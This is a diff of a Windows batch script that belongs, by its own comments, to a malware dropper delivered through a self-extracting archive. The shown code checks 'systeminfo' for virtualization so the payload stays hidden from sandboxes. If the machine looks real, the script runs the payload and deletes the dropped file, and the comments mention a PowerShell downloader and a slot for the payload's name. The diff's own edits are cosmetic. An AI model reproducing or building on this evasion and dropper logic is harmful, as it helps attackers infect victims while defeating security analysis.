@@ -1,6 +1,6 @@
 @echo off
 
-REM # Authered by B1kRb7
+REM # Authered by b1krb7
 REM -----------------------------------------------------------------------------------
 REM # Simple bat script to check the environment for signs of virtualization.
 REM # Powershell downloader, with a preBat script to execute the VM Detection bat
@@ -8,9 +8,9 @@ REM # from a hidden window.
 REM # These scripts are executed once the SFX Archive unzips itself into Temp directory
 REM # If signs of virtualization is found, the payload will be deleted.
 REM # If the machine seems real, the payload is run and then the dropped file deleted from system.
-
+REM # [!] Any extra strings can easily be added
 REM # ** !!Important!! **
-REM # Check PAYLOAD to the name of the payload to be run.
+REM # Change PAYLOAD to the name of the payload to be run.
 REM -----------------------------------------------------------------------------------
 
 REM -------------------------------
@@ -27,7 +27,7 @@ for %%x in (svc.log) do if not %%~zx==0 (
       	    del checkV.bat
 ) else (
 	    del svc.log
-      systeminfo | findstr "Model:" > vm.log												
+      	    systeminfo | findstr "Model:" > vm.log												
 	    set /p var= < vm.log
 	    del vm.log
 
